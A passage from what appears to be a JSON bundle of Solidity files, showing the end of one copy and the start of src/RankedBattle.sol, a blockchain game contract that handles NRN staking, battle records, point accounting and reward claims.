_voltageManagerInstance.spendVoltage(fighterOwner, VOLTAGE_COST);\n        }\n        totalBattles += 1;\n    }\n\n    /// @notice Gets the battle record for a token.\n    /// @param tokenId The ID of the token.\n    /// @return Record which is comprised of wins, ties, and losses for the token.\n    function getBattleRecord(uint256 tokenId) external view returns(uint32, uint32, uint32) {\n      return (\n          fighterBattleRecord[tokenId].wins, \n          fighterBattleRecord[tokenId].ties, \n          fighterBattleRecord[tokenId].loses\n      );\n    }\n\n    /// @notice Gets the staking data for a token.\n    /// @return Round id, nrns to be distributed, and total point tally\n    function getCurrentStakingData() external view returns(uint256, uint256, uint256) {\n      return (\n          roundId,\n          rankedNrnDistribution[roundId], \n          totalAccumulatedPoints[roundId]\n      );\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            PUBLIC FUNCTIONS\n    //////////////////////////////////////////////////////////////*/    \n\n    /// @notice Retrieves the nrn distribution amount for the given round ID.\n    /// @param roundId_ The round ID for which to get the nrn distribution.\n    /// @return Distribution amount for the specified round ID.\n    function getNrnDistribution(uint256 roundId_) public view returns(uint256) {\n        return rankedNrnDistribution[roundId_];\n    }\n\n    /// @notice Gets the unclaimed NRN tokens for a specific address.\n    /// @param claimer The address of the claimer.\n    /// @return The amount of unclaimed NRN tokens.\n    function getUnclaimedNRN(address claimer) public view returns(uint256) {\n        uint256 claimableNRN = 0;\n        uint256 nrnDistribution;   \n        uint32 lowerBound = numRoundsClaimed[claimer];\n        for (uint32 i = lowerBound; i < roundId; i++) {\n            nrnDistribution = getNrnDistribution(i);\n            claimableNRN += (\n                accumulatedPointsPerAddress[claimer][i] * nrnDistribution\n            ) / totalAccumulatedPoints[i];\n        }\n        return claimableNRN;\n    } \n\n    /*//////////////////////////////////////////////////////////////\n                            PRIVATE FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Adds result points for a battle, based on the battle result, ELO factor, and merging portion.\n    /// @dev This function is called internally and is not accessible externally.\n    /// @dev There are 5 scenarios to be aware of:\n    /// @dev 1) Win + no stake-at-risk = Increase points balance\n    /// @dev 2) Win + stake-at-risk = Reclaim some of the stake that is at risk\n    /// @dev 3) Lose + positive point balance = Deduct from the point balance\n    /// @dev 4) Lose + no points = Move some of their NRN staked to the Stake At Risk contract\n    /// @dev 5) Tie = no consequence\n    /// @param battleResult The result of the battle (0: win, 1: tie, 2: loss).\n    /// @param tokenId The ID of the token participating in the battle.\n    /// @param eloFactor Multiple derived from ELO to be applied to the base points earned.\n    /// @param mergingPortion The portion of points that get redirected to the merging pool.\n    /// @param fighterOwner The address which owns the fighter whos points are being altered.\n    function _addResultPoints(\n        uint8 battleResult, \n        uint256 tokenId, \n        uint256 eloFactor, \n        uint256 mergingPortion,\n        address fighterOwner\n    ) \n        private \n    {\n        uint256 stakeAtRisk;\n        uint256 curStakeAtRisk;\n        uint256 points = 0;\n\n        /// Check how many NRNs the fighter has at risk\n        stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);\n\n        /// Calculate the staking factor if it has not already been calculated for this round \n        if (_calculatedStakingFactor[tokenId][roundId] == false) {\n            stakingFactor[tokenId] = _getStakingFactor(tokenId, stakeAtRisk);\n            _calculatedStakingFactor[tokenId][roundId] = true;\n        }\n\n        /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract\n        curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;\n        if (battleResult == 0) {\n            /// If the user won the match\n\n            /// If the user has no NRNs at risk, then they can earn points\n            if (stakeAtRisk == 0) {\n                points = stakingFactor[tokenId] * eloFactor;\n            }\n\n            /// Divert a portion of the points to the merging pool\n            uint256 mergingPoints = (points * mergingPortion) / 100;\n            points -= mergingPoints;\n            _mergingPoolInstance.addPoints(tokenId, mergingPoints);\n\n            /// Do not allow users to reclaim more NRNs than they have at risk\n            if (curStakeAtRisk > stakeAtRisk) {\n                curStakeAtRisk = stakeAtRisk;\n            }\n\n            /// If the user has stake-at-risk for their fighter, reclaim a portion\n            /// Reclaiming stake-at-risk puts the NRN back into their staking pool\n            if (curStakeAtRisk > 0) {\n                _stakeAtRiskInstance.reclaimNRN(curStakeAtRisk, tokenId, fighterOwner);\n                amountStaked[tokenId] += curStakeAtRisk;\n            }\n\n            /// Add points to the fighter for this round\n            accumulatedPointsPerFighter[tokenId][roundId] += points;\n            accumulatedPointsPerAddress[fighterOwner][roundId] += points;\n            totalAccumulatedPoints[roundId] += points;\n            if (points > 0) {\n                emit PointsChanged(tokenId, points, true);\n            }\n        } else if (battleResult == 2) {\n            /// If the user lost the match\n\n            /// Do not allow users to lose more NRNs than they have in their staking pool\n            if (curStakeAtRisk > amountStaked[tokenId]) {\n                curStakeAtRisk = amountStaked[tokenId];\n            }\n            if (accumulatedPointsPerFighter[tokenId][roundId] > 0) {\n                /// If the fighter has a positive point balance for this round, deduct points \n                points = stakingFactor[tokenId] * eloFactor;\n                if (points > accumulatedPointsPerFighter[tokenId][roundId]) {\n                    points = accumulatedPointsPerFighter[tokenId][roundId];\n                }\n                accumulatedPointsPerFighter[tokenId][roundId] -= points;\n                accumulatedPointsPerAddress[fighterOwner][roundId] -= points;\n                totalAccumulatedPoints[roundId] -= points;\n                if (points > 0) {\n                    emit PointsChanged(tokenId, points, false);\n                }\n            } else {\n                /// If the fighter does not have any points for this round, NRNs become at risk of being lost\n                bool success = _neuronInstance.transfer(_stakeAtRiskAddress, curStakeAtRisk);\n                if (success) {\n                    _stakeAtRiskInstance.updateAtRiskRecords(curStakeAtRisk, tokenId, fighterOwner);\n                    amountStaked[tokenId] -= curStakeAtRisk;\n                }\n            }\n        }\n    }\n\n    /// @notice Updates the battle record for a token.\n    /// @param tokenId The ID of the token.\n    /// @param battleResult The result of the battle.\n    function _updateRecord(uint256 tokenId, uint8 battleResult) private {\n        if (battleResult == 0) {\n            fighterBattleRecord[tokenId].wins += 1;\n        } else if (battleResult == 1) {\n            fighterBattleRecord[tokenId].ties += 1;\n        } else if (battleResult == 2) {\n            fighterBattleRecord[tokenId].loses += 1;\n        }\n    }\n\n    /// @notice Gets the staking factor for a token.\n    /// @param tokenId The ID of the token.\n    /// @param stakeAtRisk The amount of stake they have at risk.\n    /// @return Staking factor.\n    function _getStakingFactor(\n        uint256 tokenId, \n        uint256 stakeAtRisk\n    ) \n        private \n        view \n        returns (uint256) \n    {\n      uint256 stakingFactor_ = FixedPointMathLib.sqrt(\n          (amountStaked[tokenId] + stakeAtRisk) / 10**18\n      );\n      if (stakingFactor_ == 0) {\n        stakingFactor_ = 1;\n      }\n      return stakingFactor_;\n    }    \n}"
    },
    {
      "filename": "src/RankedBattle.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0 <0.9.0;\n\nimport { FighterFarm } from \"./FighterFarm.sol\";\nimport { VoltageManager } from \"./VoltageManager.sol\";\nimport { MergingPool } from \"./MergingPool.sol\";\nimport { Neuron } from \"./Neuron.sol\";\nimport { StakeAtRisk } from \"./StakeAtRisk.sol\";\nimport { FixedPointMathLib } from './FixedPointMathLib.sol';\n\n/// @title RankedBattle\n/// @author ArenaX Labs Inc.\n/// @notice This contract provides functionality for staking NRN tokens on fighters, \n/// tracking battle records, calculating and distributing rewards based on battle outcomes \n/// and staked amounts, and allowing claiming of accumulated rewards.\ncontract RankedBattle {\n\n    /// @dev Extend functionality of the FixedPointMathLib library to the uint data type.\n    using FixedPointMathLib for uint;\n\n    /*//////////////////////////////////////////////////////////////\n                                EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Event emitted when staked.\n    event Staked(address from, uint256 amount);\n\n    /// @notice Event emitted when unstaked.\n    event Unstaked(address from, uint256 amount);\n\n    /// @notice Event emitted when claimed.\n    event Claimed(address claimer, uint256 amount);\n\n    /// @notice Event emitted when points are added or subtracted from a fighter.\n    event PointsChanged(uint256 tokenId, uint256 points, bool increased);    \n\n    /*//////////////////////////////////////////////////////////////\n                                STRUCTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Struct for battle record.\n    struct BattleRecord {\n        uint32 wins;\n        uint32 ties;\n        uint32 loses;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            STATE VARIABLES\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Voltage cost per match initiated\n    uint8 public constant VOLTAGE_COST = 10;\n\n    /// @notice Number of total battles.\n    uint256 public totalBattles = 0;\n\n    /// @notice Number of overall staked amount.\n    uint256 public globalStakedAmount = 0;\n\n    /// @notice Current round number.\n    uint256 public roundId = 0;\n\n    /// @notice Amount of basis points that get taken away from a player's stake when they lose in \n    /// a point deficit.\n    uint256 public bpsLostPerLoss = 10;\n\n    /// The StakeAtRisk contract address.\n    address _stakeAtRiskAddress;\n\n    /// The address that has owner privileges (initially the contract deployer).\n    address _ownerAddress;\n\n    /// @notice The address in charge of updating battle records.\n    address _gameServerAddress;\n\n    /*//////////////////////////////////////////////////////////////\n                            CONTRACT INSTANCES\n    //////////////////////////////////////////////////////////////*/ \n\n    /// @notice The neuron contract instance.\n    Neuron _neuronInstance;\n\n    /// @notice The fighter farm contract instance.\n    FighterFarm _fighterFarmInstance;\n\n    /// @notice The voltage manager contract instance.\n    VoltageManager _voltageManagerInstance;\n\n    /// @notice The merging pool contract instance.\n    MergingPool _mergingPoolInstance;\n\n    /// @notice The stake at risk contract instance.\n    StakeAtRisk _stakeAtRiskInstance;\n\n    /*//////////////////////////////////////////////////////////////\n                                MAPPINGS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Maps addresses that are admins.\n    mapping(address => bool) public isAdmin;\n\n    /// @notice Mapping of token id to battle record struct.\n    mapping(uint256 => BattleRecord) public fighterBattleRecord;\n\n    /// @notice Mapping of address to the amount of NRNs they have claimed.\n    mapping(address => uint256) public amountClaimed;\n\n    /// @notice Maps the user address to the number of rounds they've claimed for\n    mapping(address => uint32) public numRoundsClaimed;\n\n    /// @notice Maps address to round ID to track accumulated points.\n    mapping(address => mapping(uint256 => uint256)) public accumulatedPointsPerAddress;\n\n    /// @notice Maps token ID to round ID to track accumulated points.\n    mapping(uint256 => mapping(uint256 => uint256)) public accumulatedPointsPerFighter;\n\n    /// @notice Maps round ID to total accumulated points.\n    mapping(uint256 => uint256) public totalAccumulatedPoints;\n\n    /// @notice Mapping of roundID to nrn distribution amount for a ranked period.\n    mapping(uint256 => uint256) public rankedNrnDistribution;\n\n    /// @notice Maps the token ID to the round ID and indicates whether it is Unstaked or not.\n    mapping(uint256 => mapping(uint256 => bool)) public hasUnstaked;\n\n    /// @notice Mapping of token id to staked amount.\n    mapping(uint256 => uint256) public amountStaked;\n\n    /// @notice Mapping of token id to staking factor.\n    mapping(uint256 => uint256) public stakingFactor;\n\n    /// @notice Indicates whether we have calculated the staking factor for a given round and token.\n    mapping(uint256 => mapping(uint256 => bool)) _calculatedStakingFactor;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Initializes the contract by setting various addresses and instantiating \n    /// contract instances. It also designates the owner address as an admin. \n    /// @param ownerAddress Address of contract deployer.\n    /// @param gameServerAddress The game server address.\n    /// @param fighterFarmAddress Address of the FighterFarm contract.\n    /// @param voltageManagerAddress Address of the VoltageManager contract.\n    constructor(\n      address ownerAddress, \n      address gameServerAddress,\n      address fighterFarmAddress,\n      address voltageManagerAddress\n    ) {\n        _ownerAddress = ownerAddress;\n        _gameServerAddress = gameServerAddress;\n        _fighterFarmInstance = FighterFarm(fighterFarmAddress);\n        _voltageManagerInstance = VoltageManager(voltageManagerAddress);\n        isAdmin[_ownerAddress] = true;\n        rankedNrnDistribution[0] = 5000 * 10**18;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            EXTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Transfers ownership from one address to another.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param newOwnerAddress The address of the new owner\n    function transferOwnership(address newOwnerAddress) external {\n        require(msg.sender == _ownerAddress);\n        _ownerAddress = newOwnerAddress;\n    }\n\n    /// @notice Adjusts admin access for a user.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param adminAddress The address of the admin.\n    /// @param access Whether the address has admin access or not.\n    function adjustAdminAccess(address adminAddress, bool access) external {\n        require(msg.sender == _ownerAddress);\n        isAdmin[adminAddress] = access;\n    }  \n\n    /// @notice Sets the game server address.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param gameServerAddress The game server address.\n    function setGameServerAddress(address gameServerAddress) external {\n        require(msg.sender == _ownerAddress);\n        _gameServerAddress = gameServerAddress;\n    }\n\n    /// @notice Sets the Stake at Risk contract address and instantiates the contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param stakeAtRiskAddress The address of the Stake At Risk contract.\n    function setStakeAtRiskAddress(address stakeAtRiskAddress) external {\n        require(msg.sender == _ownerAddress);\n        _stakeAtRiskAddress = stakeAtRiskAddress;\n        _stakeAtRiskInstance = StakeAtRisk(_stakeAtRiskAddress);\n    }\n\n    /// @notice Instantiates the neuron contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param nrnAddress The address of the Neuron contract.\n    function instantiateNeuronContract(address nrnAddress) external {\n        require(msg.sender == _ownerAddress);\n        _neuronInstance = Neuron(nrnAddress);\n    }\n\n    /// @notice Instantiates the merging pool contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param mergingPoolAddress The address of the MergingPool contract.\n    function instantiateMergingPoolContract(address mergingPoolAddress) external {\n        require(msg.sender == _ownerAddress);\n        _mergingPoolInstance = MergingPool(mergingPoolAddress);\n    }\n\n    /// @notice Sets the ranked nrn distribution amount for the current round.\n    /// @dev Only admins are authorized to change the ranked NRN distribution.\n    /// @dev newDistribution is NOT denominated in wei. As such, it is multiplied by 10**18.\n    /// @param newDistribution The new distribution amount.\n    function setRankedNrnDistribution(uint256 newDistribution) external {\n        require(isAdmin[msg.sender]);\n        rankedNrnDistribution[roundId] = newDistribution * 10**18;\n    }\n\n    /// @notice Sets the basis points lost per ranked match lost while in a point deficit.\n    /// @dev Only admins are authorized to ca"
    }
  ]
}